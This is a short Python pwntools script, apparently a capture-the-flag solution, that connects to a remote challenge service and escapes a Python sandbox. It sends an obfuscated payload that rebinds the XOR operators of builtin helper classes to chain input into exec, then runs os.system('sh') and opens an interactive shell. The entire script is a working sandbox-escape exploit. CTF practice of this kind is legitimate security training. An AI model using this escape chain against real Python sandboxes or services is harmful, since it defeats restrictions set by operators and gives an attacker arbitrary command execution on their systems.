# inspiration from https://codegolf.stackexchange.com/a/264375
from pwn import *

p = remote("ctf.tcp1p.com", 23945)
#p = process("./sandbox.py")

payload = (
	'["" for re.__builtins__["help"].__class__.__rxor__ in [re.__builtins__["exec"]]'
	'for re.__builtins__["license"].__class__.__xor__ in [re.__builtins__["input"]]]'
	'[re.__builtins__["license"]^""^re.__builtins__["help"]]'.replace(' ', '\t')
)
p.recvuntil(b": ")
p.sendline(payload.encode())
p.sendline(b"re.__builtins__['__import__']('os').system('sh')")
p.interactive()